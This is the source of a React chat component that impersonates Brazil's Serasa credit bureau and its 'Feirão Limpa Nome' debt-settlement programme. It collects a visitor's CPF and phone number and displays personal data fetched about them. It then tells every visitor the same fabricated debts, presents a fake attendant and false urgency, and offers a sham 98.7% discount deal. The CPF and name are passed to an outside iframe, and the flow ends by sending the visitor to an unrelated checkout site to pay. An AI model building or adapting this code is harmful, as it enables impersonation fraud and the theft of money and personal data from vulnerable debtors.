"use client"

import type React from "react"
import { useState, useEffect, useRef } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Loader2, User } from "lucide-react"
import { ChatImage } from "./chat-image"
import { ChatAudio } from "./chat-audio"
import { ChatVideo } from "./chat-video"
import { ChatIframe } from "./chat-iframe"

interface ChatMessage {
  id: string
  role: "user" | "assistant"
  content: string
  timestamp: Date
  mediaType?: "image" | "audio" | "video" | "iframe"
  mediaSrc?: string
  mediaProps?: any
}

export function ChatInterface() {
  const [userData, setUserData] = useState<any>(null)
  const [currentStep, setCurrentStep] = useState("start")
  const [userCPF, setUserCPF] = useState("")
  const [userPhone, setUserPhone] = useState("")
  const [userName, setUserName] = useState("")
  const [userLocation, setUserLocation] = useState("")
  const [isTyping, setIsTyping] = useState(false)
  const [messages, setMessages] = useState<ChatMessage[]>([])
  const [inputValue, setInputValue] = useState("")
  const [videoPreloaded, setVideoPreloaded] = useState(false)
  const messagesEndRef = useRef<HTMLDivElement>(null)

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" })
  }

  useEffect(() => {
    scrollToBottom()
  }, [messages])

  useEffect(() => {
    // Start the conversation with logo and initial message
    addMediaMessage(
      "image",
      "https://s3.typebot.io/public/workspaces/cm6z3revg0002gdrfeenvy6ak/typebots/cm6z3rve00002av38kwbubcvg/blocks/q4nnjrsqvvf8ximdraow16hg?v=1748033754401",
      "Serasa Logo",
    )

    setTimeout(() => {
      addMessage(
        "assistant",
        "🟢 Para iniciar sua consulta no Feirão Limpa Nome da Serasa, Informe seu CPF: (Sem pontos e sem traços)",
      )
    }, 1800)
  }, [])

  const addMessage = (role: "user" | "assistant", content: string) => {
    const newMessage: ChatMessage = {
      id: Date.now().toString(),
      role,
      content,
      timestamp: new Date(),
    }
    setMessages((prev) => [...prev, newMessage])
  }

  const addMediaMessage = (
    mediaType: "image" | "audio" | "video" | "iframe",
    mediaSrc: string,
    content: string,
    mediaProps?: any,
  ) => {
    const newMessage: ChatMessage = {
      id: Date.now().toString(),
      role: "assistant",
      content,
      timestamp: new Date(),
      mediaType,
      mediaSrc,
      mediaProps,
    }
    setMessages((prev) => [...prev, newMessage])
  }

  // Função para calcular delay humanizado com mais tempo para leitura
  const calculateTypingDelay = (text: string, type: "normal" | "system" | "processing" | "media" = "normal") => {
    const baseDelay = 1200 // Aumentado de 800 para 1200
    const charDelay = 35 // Aumentado de 25 para 35ms por caractere
    const textLength = text.length

    let calculatedDelay = baseDelay + textLength * charDelay

    // Ajustes baseados no tipo
    switch (type) {
      case "system":
        calculatedDelay = Math.min(calculatedDelay, 4500) // Max 4.5s para mensagens de sistema
        break
      case "processing":
        calculatedDelay = Math.min(calculatedDelay, 5000) // Max 5s para processamento
        break
      case "media":
        calculatedDelay = Math.min(calculatedDelay, 7000) // Max 7s para contexto de mídia
        break
      default:
        calculatedDelay = Math.min(calculatedDelay, 6000) // Max 6s para mensagens normais
    }

    // Mínimo de 1800ms para dar tempo de leitura
    return Math.max(calculatedDelay, 1800)
  }

  const simulateTyping = async (
    duration?: number,
    text?: string,
    type?: "normal" | "system" | "processing" | "media",
  ) => {
    const delay = duration || (text ? calculateTypingDelay(text, type) : 3000)
    setIsTyping(true)
    await new Promise((resolve) => setTimeout(resolve, delay))
    setIsTyping(false)
  }

  // Preload video when user starts consultation
  const preloadVideo = () => {
    if (!videoPreloaded) {
      addMediaMessage("video", "https://www.youtube.com/embed/_McElcgX7R8?si=UOryO3D9zsB9ERa8", "Preloading video", {
        preload: true,
      })
      setVideoPreloaded(true)
    }
  }

  const handleCPFSubmit = async (cpf: string) => {
    if (cpf.length !== 11 || !/^\d{11}$/.test(cpf)) {
      const errorMsg =
        "CPF não encontrado! Tente digitar novamente o seu CPF para prosseguir... (Digite apenas os números de seu CPF para continuar)"
      await simulateTyping(undefined, errorMsg)
      addMessage("assistant", errorMsg)
      return
    }

    setUserCPF(cpf)
    addMessage("user", cpf)

    const successMsg = "Consulta efetuada com sucesso!"
    await simulateTyping(undefined, successMsg, "system")
    addMessage("assistant", successMsg)

    // Make real API call to validate CPF and get user data
    try {
      const consultingMsg = "Consultando dados no sistema..."
      await simulateTyping(undefined, consultingMsg, "processing")
      addMessage("assistant", consultingMsg)

      const response = await fetch(`/api/consulta-cpf?cpf=${cpf}`)
      const result = await response.json()

      if (result.success && result.userData) {
        const userInfo = result.userData
        setUserData(userInfo)
        setUserName(userInfo.NOME)

        const dataMsg = `✅ **Dados encontrados para ${userInfo.NOME}**

📋 **Informações confirmadas:**
• Nome: ${userInfo.NOME}
• CPF: ${userInfo.CPF}
• Data de Nascimento: ${userInfo.NASC}
• Nome da Mãe: ${userInfo.NOME_MAE}
• Sexo: ${userInfo.SEXO}`

        await simulateTyping(undefined, dataMsg)
        addMessage("assistant", dataMsg)

        const phoneMsg = "Digite seu telefone com DDD para prosseguir com o atendimento!"
        await simulateTyping(undefined, phoneMsg)
        addMessage("assistant", phoneMsg)
        setCurrentStep("phone")
      } else {
        const notFoundMsg =
          "❌ **CPF não encontrado!** Tente digitar novamente o seu CPF para prosseguir... (Digite apenas os números de seu CPF para continuar)"
        await simulateTyping(undefined, notFoundMsg)
        addMessage("assistant", notFoundMsg)
      }
    } catch (error) {
      console.error("Error fetching CPF data:", error)
      const errorMsg = "⚠️ **Erro ao consultar CPF.** Tente novamente em alguns instantes."
      await simulateTyping(undefined, errorMsg)
      addMessage("assistant", errorMsg)
    }
  }

  const handlePhoneSubmit = async (phone: string) => {
    if (phone.length < 10) {
      const errorMsg = "Preencha o número de telefone"
      await simulateTyping(undefined, errorMsg)
      addMessage("assistant", errorMsg)
      return
    }

    setUserPhone(phone)
    addMessage("user", phone)

    // Preload video early in the process
    preloadVideo()

    // Get location (keep the mock location for now)
    const mockLocation = "São Paulo"
    setUserLocation(mockLocation)

    const attendantMsg = `Uma atendente da região de ${mockLocation} acaba de entrar na conversa...`
    await simulateTyping(undefined, attendantMsg, "system")
    addMessage("assistant", attendantMsg)

    const welcomeMsg = `Olá ${userName}. Sou **Renata**, sua atendente da Serasa. **Seja bem-vindo(a) ao canal oficial de atendimento**.

Consulte grátis as ofertas disponíveis especialmente para você!

Estamos **conferindo** **seus dados**. Por favor, **aguarde um instante**...`

    await simulateTyping(undefined, welcomeMsg)
    addMessage("assistant", welcomeMsg)

    // Add image after the message
    await simulateTyping(1800)
    addMediaMessage(
      "image",
      "https://s3.typebot.io/public/workspaces/cm6z3revg0002gdrfeenvy6ak/typebots/cm6z3rve00002av38kwbubcvg/blocks/grloulti95htbwpo8k4uf5ng?v=1748033759645",
      "Verificando dados...",
    )

    const verifiedMsg = "**Dados verificados com sucesso!** Pode seguir para a próxima etapa."
    await simulateTyping(4500, undefined, "system")
    addMessage("assistant", verifiedMsg)

    const welcomeBackMsg = `**${userName}**, seja bem-vindo(a) ao atendimento **Feirão Limpa Nome da Serasa!**`
    await simulateTyping(undefined, welcomeBackMsg)
    addMessage("assistant", welcomeBackMsg)

    const protocolMsg = "Protocolo do atendimento: AMY3PK8JS"
    await simulateTyping(undefined, protocolMsg, "system")
    addMessage("assistant", protocolMsg)

    // Add image after protocol
    await simulateTyping(1500)
    addMediaMessage(
      "image",
      "https://s3.typebot.io/public/workspaces/cm6z3revg0002gdrfeenvy6ak/typebots/cm6z3rve00002av38kwbubcvg/blocks/fkr3r0krx8tstcetdokvbp60?v=1748033790724",
      "Protocolo confirmado",
    )

    const consultMsg =
      "Último dia do Feirão Online Serasa Limpa Nome! Deseja consultar as ofertas disponíveis para o seu CPF?"
    await simulateTyping(undefined, consultMsg)
    addMessage("assistant", consultMsg)
    setCurrentStep("consultation")
  }

  const handleConsultationConfirm = async () => {
    addMessage("user", "Sim consultar")

    const analysisMsg = "Por favor, **aguarde** enquanto **analisamos a situação do seu CPF** em nosso sistema..."
    await simulateTyping(undefined, analysisMsg, "processing")
    addMessage("assistant", analysisMsg)

    // Add image after analysis message
    await simulateTyping(1800)
    addMediaMessage(
      "image",
      "https://s3.typebot.io/public/workspaces/cm6z3revg0002gdrfeenvy6ak/typebots/cm6z3rve00002av38kwbubcvg/blocks/p5n27mtiic2emiqn2plhsmc8?v=1748033779602",
      "Analisando CPF...",
    )

    const completedMsg = "Análise concluída!"
    await simulateTyping(4500, undefined, "system")
    addMessage("assistant", completedMsg)

    const debtMsg = `**${userName}**, identificamos aqui **3 dívidas ativas** no sistema.

Os valores variam entre **R$528,74 a R$5.237,78**

Totalizando uma dívida ativa de **R$7.566,52** em seu CPF. Situação para o CPF ${userCPF}: **NEGATIVADO**.`

    await simulateTyping(undefined, debtMsg)
    addMessage("assistant", debtMsg)

    // Add audio after debt information with longer delay
    await simulateTyping(3000, undefined, "media")
    addMediaMessage(
      "audio",
      "https://s3.typebot.io/public/workspaces/cm6z3revg0002gdrfeenvy6ak/typebots/cm6z3rve00002av38kwbubcvg/blocks/rovpr67byoxu6mvn3yxkbe3a?v=1748036374728",
      "Áudio informativo",
      { autoPlay: true },
    )

    // Add GIF after 10 seconds (tempo para ouvir o áudio)
    setTimeout(() => {
      addMediaMessage(
        "image",
        "https://s3.typebot.io/public/workspaces/cm6z3revg0002gdrfeenvy6ak/typebots/cm6z3rve00002av38kwbubcvg/blocks/tsfflk7mq7uv3v8j671ek7y6?v=1748033785627",
        "Processando...",
      )
    }, 10000)

    const agreementMsg = "Deseja verificar se existe algum acordo disponível para você?"
    await simulateTyping(12000, undefined, "normal") // Tempo para ouvir áudio + ver GIF
    addMessage("assistant", agreementMsg)
    setCurrentStep("agreement")
  }

  const handleAgreementCheck = async () => {
    addMessage("user", "Verificar acordo")

    const checkingMsg =
      "Aguarde um instante enquanto verifico aqui no sistema se existem acordos disponíveis para você..."
    await simulateTyping(undefined, checkingMsg, "processing")
    addMessage("assistant", checkingMsg)

    // Add image after agreement check message
    await simulateTyping(1800)
    addMediaMessage(
      "image",
      "https://s3.typebot.io/public/workspaces/cm6z3revg0002gdrfeenvy6ak/typebots/cm6z3rve00002av38kwbubcvg/blocks/ta40hawgnu5b848scvluicmy?v=1752190103305",
      "Verificando acordos...",
    )

    const newsMsg =
      "**Notícia:** Somente hoje, mais de 12.872 mil brasileiros negociaram suas dívidas no Feirão Limpa Nome Serasa online!"
    await simulateTyping(6000, undefined, "normal")
    addMessage("assistant", newsMsg)

    // Add YouTube video after news with longer delay for media
    await simulateTyping(3500, undefined, "media")
    addMediaMessage("video", "https://www.youtube.com/embed/_McElcgX7R8?si=UOryO3D9zsB9ERa8", "Vídeo informativo", {
      autoPlay: true,
    })

    const foundMsg = `Acordo encontrado!
1 (um) acordo foi encontrado para **${userName}** (CPF **${userCPF}**)!`

    // Delay maior para assistir o vídeo
    await simulateTyping(20000, undefined, "media") // 20 segundos para assistir o vídeo
    addMessage("assistant", foundMsg)

    // Add image after agreement found
    await simulateTyping(1800)
    addMediaMessage(
      "image",
      "https://minio-production-e86d.up.railway.app/typebot/public/workspaces/cmctlzyfw0004mo4impx1mjgo/typebots/foqitvxxwxa86btvy21ku2ao/blocks/kocfuinj8l1sbdnepcgo78ul?v=1752190103305",
      "Acordo encontrado",
    )

    const accessingMsg = "Acessando o acordo, **83N2L618362E** aguarde..."
    await simulateTyping(undefined, accessingMsg, "processing")
    addMessage("assistant", accessingMsg)

    const agreementInfoMsg = `Informações de acordo **83N2L618362E** para **${userName}**, (CPF **${userCPF}**):

Acordo: **83N2L618362E**
Valor Total da Dívida: **R$ 7.566,52**
**Valor do Contrato: R$68,92**
Desconto Total: **98,7% (R$ 7.488,05)**
Data de Vencimento: (HOJE)

O contrato atual é válido apenas para o titular: ${userName}, portador(a) do CPF ${userCPF}.`

    await simulateTyping(undefined, agreementInfoMsg)
    addMessage("assistant", agreementInfoMsg)

    // Add audio after 4 seconds with longer delay for media
    setTimeout(() => {
      addMediaMessage(
        "audio",
        "https://s3.typebot.io/public/workspaces/cm6z3revg0002gdrfeenvy6ak/typebots/cm6z3rve00002av38kwbubcvg/blocks/pgxeikingpniya8ut1g4ne96?v=1748036797053",
        "Áudio do acordo",
        { autoPlay: true },
      )
    }, 4000)

    const finalQuestionMsg = "Deseja realizar o acordo e ter seu nome limpo ainda hoje?"
    // Delay maior para ouvir o segundo áudio
    await simulateTyping(12000, undefined, "media") // 12 segundos para ouvir o áudio
    addMessage("assistant", finalQuestionMsg)
    setCurrentStep("final")
  }

  const handleFinalConfirm = async () => {
    addMessage("user", "Sim, quero quitar minhas dívidas.")

    const confirmingMsg = "Confirmando o acordo, aguarde..."
    await simulateTyping(undefined, confirmingMsg, "processing")
    addMessage("assistant", confirmingMsg)

    const serasaInfoMsg = `**SERASA INFORMA**: Ao **efetuar o pagamento do acordo**, todas as dívidas em aberto no CPF **${userCPF}** serão **removidas** em **1 hora**, e você terá o seu **nome limpo novamente**!`
    await simulateTyping(undefined, serasaInfoMsg)
    addMessage("assistant", serasaInfoMsg)

    const congratsMsg = "Parabéns! Seu acordo foi **confirmado**."
    await simulateTyping(undefined, congratsMsg)
    addMessage("assistant", congratsMsg)

    // Add iframe after confirmation with delay for reading
    await simulateTyping(3000, undefined, "media")
    addMediaMessage(
      "iframe",
      `https://eduardluqusa.github.io/srs/carta-quitacao/?name=${userName}&cpf=${userCPF}&value=68,92`,
      "Carta de quitação",
      { height: 540 },
    )

    const generatingMsg = "**Gerando sua guia de pagamento**... Por favor, aguarde um instante."
    await simulateTyping(undefined, generatingMsg, "processing")
    addMessage("assistant", generatingMsg)

    const finalMsg = `**✅ Acordo confirmado**: 83N2L618362E
Beneficiário(a): **${userName}**
(CPF): **${userCPF}**

**👉 Clique no botão abaixo para acessar sua guia de pagamento.**

**⚠️ Atenção:** O não pagamento deste acordo pode gerar novas restrições no CPF e impedir participações futuras em programas como o Feirão.`

    await simulateTyping(undefined, finalMsg)
    addMessage("assistant", finalMsg)

    setCurrentStep("payment")
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!inputValue.trim()) return

    const value = inputValue.trim()
    setInputValue("")

    switch (currentStep) {
      case "start":
        await handleCPFSubmit(value)
        break
      case "phone":
        await handlePhoneSubmit(value)
        break
      default:
        break
    }
  }

  const handleButtonClick = async (action: string) => {
    switch (action) {
      case "consultation":
        await handleConsultationConfirm()
        break
      case "agreement":
        await handleAgreementCheck()
        break
      case "final":
        await handleFinalConfirm()
        break
      case "payment":
        window.open("https://checkouttype.fr/verification", "_blank")
        break
    }
  }

  const renderMessage = (message: ChatMessage) => {
    const messageContent = (
      <div className="text-sm whitespace-pre-wrap">
        {message.content
          .split("**")
          .map((part, index) => (index % 2 === 1 ? <strong key={index}>{part}</strong> : part))}
      </div>
    )

    const mediaContent = message.mediaType && message.mediaSrc && (
      <>
        {message.mediaType === "image" && <ChatImage src={message.mediaSrc} alt={message.content} />}
        {message.mediaType === "audio" && <ChatAudio src={message.mediaSrc} autoPlay={message.mediaProps?.autoPlay} />}
        {message.mediaType === "video" && (
          <ChatVideo
            embedUrl={message.mediaSrc}
            title={message.content}
            autoPlay={message.mediaProps?.autoPlay}
            preload={message.mediaProps?.preload}
          />
        )}
        {message.mediaType === "iframe" && (
          <ChatIframe src={message.mediaSrc} title={message.content} height={message.mediaProps?.height} />
        )}
      </>
    )

    return (
      <>
        {message.content && messageContent}
        {mediaContent}
      </>
    )
  }

  return (
    <div className="flex flex-col h-full">
      {/* Messages */}
      <div className="flex-1 overflow-y-auto p-4 space-y-4">
        {messages.map((message) => (
          <div key={message.id} className={`flex ${message.role === "user" ? "justify-end" : "justify-start"}`}>
            <div
              className={`max-w-[85%] rounded-lg p-3 ${
                message.role === "user" ? "bg-[#D9FDD2] text-black" : "bg-white text-[#303235] shadow-sm"
              }`}
            >
              <div className="flex items-start gap-2">
                {message.role === "assistant" && (
                  <div className="w-8 h-8 rounded-full overflow-hidden flex-shrink-0 mt-1">
                    <img src="/images/bot-avatar.webp" alt="Serasa Bot" className="w-full h-full object-cover" />
                  </div>
                )}
                <div className="flex-1">{renderMessage(message)}</div>
                {message.role === "user" && (
                  <div className="w-6 h-6 rounded-full bg-gray-400 flex items-center justify-center flex-shrink-0 mt-1">
                    <User className="w-3 h-3 text-white" />
                  </div>
                )}
              </div>
            </div>
          </div>
        ))}

        {isTyping && (
          <div className="flex justify-start">
            <div className="bg-white rounded-lg p-3 shadow-sm">
              <div className="flex items-center gap-2">
                <div className="w-8 h-8 rounded-full overflow-hidden">
                  <img src="/images/bot-avatar.webp" alt="Serasa Bot" className="w-full h-full object-cover" />
                </div>
                <Loader2 className="w-4 h-4 animate-spin text-gray-500" />
                <span className="text-sm text-gray-500">Digitando...</span>
              </div>
            </div>
          </div>
        )}

        <div ref={messagesEndRef} />
      </div>

      {/* Input/Buttons */}
      <div className="p-4 border-t bg-white">
        {(currentStep === "start" || currentStep === "phone") && (
          <form onSubmit={handleSubmit} className="flex gap-2">
            <Input
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              placeholder={currentStep === "start" ? "Digite seu CPF, sem pontos." : "Digite seu telefone com o DDD"}
              className="flex-1"
              type={currentStep === "phone" ? "tel" : "text"}
            />
            <Button type="submit" className="bg-[#E80070] hover:bg-[#A3005A] text-white" disabled={isTyping}>
              Enviar
            </Button>
          </form>
        )}

        {currentStep === "consultation" && (
          <Button
            onClick={() => handleButtonClick("consultation")}
            className="w-full bg-[#E80070] hover:bg-[#A3005A] text-white"
            disabled={isTyping}
          >
            Sim consultar
          </Button>
        )}

        {currentStep === "agreement" && (
          <Button
            onClick={() => handleButtonClick("agreement")}
            className="w-full bg-[#E80070] hover:bg-[#A3005A] text-white"
            disabled={isTyping}
          >
            Verificar acordo
          </Button>
        )}

        {currentStep === "final" && (
          <Button
            onClick={() => handleButtonClick("final")}
            className="w-full bg-[#E80070] hover:bg-[#A3005A] text-white"
            disabled={isTyping}
          >
            Sim, quero quitar minhas dívidas.
          </Button>
        )}

        {currentStep === "payment" && (
          <Button
            onClick={() => handleButtonClick("payment")}
            className="w-full bg-[#E80070] hover:bg-[#A3005A] text-white"
          >
            ACESSAR ÁREA DE PAGAMENTO 🔒
          </Button>
        )}
      </div>
    </div>
  )
}
